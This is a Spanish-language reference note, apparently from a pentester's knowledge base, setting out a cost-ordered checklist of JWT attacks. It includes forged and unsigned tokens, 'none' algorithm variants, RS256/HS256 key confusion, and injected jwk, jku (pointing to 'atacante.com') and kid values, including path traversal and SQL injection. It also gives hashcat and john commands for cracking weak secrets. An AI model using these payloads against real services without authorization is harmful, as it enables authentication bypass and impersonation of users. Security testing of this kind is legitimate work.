---
tipo: meta
aliases:
  - Payloads JWT
  - Ataques a JWT
tags:
  - meta/referencia
  - dominio/web
---

# JWT - matriz de referencia

> [!info] Referencia pura, no un zettel
> Ordenada por **coste de descarte**: las primeras tres pruebas son una petición cada una y cubren la mayor parte de lo explotable. El criterio está en [[Sesión - falsificación de JWT]].

## 0. Leer el token — gratis

```
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIiwicm9sZSI6InVzZXIifQ.xxxxx
└── cabecera ──┘ └────── afirmaciones ──────┘ └ firma ┘
```

Los dos primeros segmentos son base64url. Se decodifican sin ninguna clave: **el contenido de un JWT no está cifrado**.

Qué mirar en la cabecera:

```
alg    el algoritmo declarado   → decide qué ataques valen
kid    identificador de clave   → posible punto de inyección
jku    URL del conjunto de claves
x5u    URL del certificado
jwk    clave incrustada en el propio token
typ    cty  → confusiones de tipo
```

Qué mirar en las afirmaciones: lo que se quiere cambiar. `sub`, `user_id`, `role`, `admin`, `scope`, `tenant`, `groups`.

Y un hallazgo propio, independiente de todo lo demás: **si hay datos sensibles en las afirmaciones**, eso se reporta aunque la firma sea perfecta.

## 1. ¿Se verifica la firma? — una petición

Cambiar una afirmación, dejar la firma intacta, enviar.

```
{"sub":"1","role":"user"}  →  {"sub":"1","role":"admin"}
```

Si el servidor lo acepta, no verifica nada y el trabajo terminó. Pasa más de lo que debería en servicios internos.

Variante: **borrar la firma** y dejar el punto final.

```
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.
```

## 2. Algoritmo `none` — una petición

```json
{"alg":"none","typ":"JWT"}
```

Token con dos segmentos y el tercero vacío, conservando el punto final. Variantes de capitalización, porque algunos filtros comparan literal:

```
none  None  NONE  nOnE
```

Casi extinto en bibliotecas mantenidas. Cuesta una petición.

## 3. Confusión de algoritmo — la que más funciona

El servidor espera `RS256` (asimétrico) y el token declara `HS256` (simétrico). Si la implementación elige el algoritmo según el token, verifica un HMAC usando como secreto **la clave pública**, que es pública.

```
1. Conseguir la clave pública
   /.well-known/jwks.json     /jwks.json     /.well-known/openid-configuration
   o extraerla del certificado TLS, o derivarla de dos tokens RS256 firmados
2. Cambiar alg a HS256
3. Firmar con HMAC usando la clave pública EXACTA como secreto
```

El detalle que arruina el intento: la clave tiene que usarse **byte a byte como el servidor la tiene**, formato PEM incluido, con sus saltos de línea y su nueva línea final. Casi todos los fracasos son por eso, no porque la vulnerabilidad no exista.

## 4. Clave provista por el atacante

```json
{"alg":"HS256","jwk":{"kty":"oct","k":"c2VjcmV0"}}
```

Clave incrustada en la cabecera. Si el servidor la usa, firma quien quiera.

```json
{"alg":"RS256","jku":"https://atacante.com/jwks.json"}
```

Conjunto de claves remoto. Se sirve uno propio y se firma con la privada correspondiente. Cuando hay validación del dominio, se combina con los bypass de [[SSRF evasión - matriz de referencia]] § Lista blanca.

```json
{"kid":"../../../../dev/null"}
```

`kid` como ruta: apuntar a un archivo de contenido conocido y firmar con eso. `/dev/null` da secreto vacío.

```json
{"kid":"x' UNION SELECT 'clave"}
```

`kid` como consulta: si la clave se busca en una base, es un punto de inyección hacia [[MOC - SQL injection]].

## 5. Secreto débil — caro, fuera de línea

Solo con `HS256`. Se recupera el secreto probando contra la firma, sin tocar el servidor.

```sh
hashcat -a 0 -m 16500 token.jwt rockyou.txt
john --format=HMAC-SHA256 --wordlist=rockyou.txt token.jwt
```

Vale la pena cuando el servicio es interno o hecho a medida, donde el secreto suele ser una cadena elegida a mano. Con secretos generados no llega a nada.

**No genera una sola petición al objetivo**: es el ataque más silencioso del dominio.

## 6. Afirmaciones, con firma válida

Una firma impecable no implica un token validado. Probar:

```
exp vencido        → ¿se verifica el vencimiento?
iss de otro emisor → ¿se verifica quién lo emitió?
aud de otra app    → ¿un token válido de otra aplicación del mismo proveedor sirve acá?
nbf en el futuro   → ¿se respeta?
alg correcto, sub de otro usuario, firma propia con secreto conocido
```

La tercera es la que más impacto tiene en organizaciones con proveedor de identidad compartido: un token legítimo emitido para otra aplicación es un token legítimo.

## 7. Orden de trabajo recomendado

```
leer el token           gratis
¿se verifica?           1 petición
alg: none               1 petición
confusión HS/RS         requiere la clave pública
jwk / jku / kid         requiere infraestructura o inyección
afirmaciones            1 petición cada una
secreto débil           caro, fuera de línea, último
```

Si las primeras tres fallan y la biblioteca es moderna, lo que queda son las afirmaciones — que es donde más veces hay algo, y donde menos gente mira.
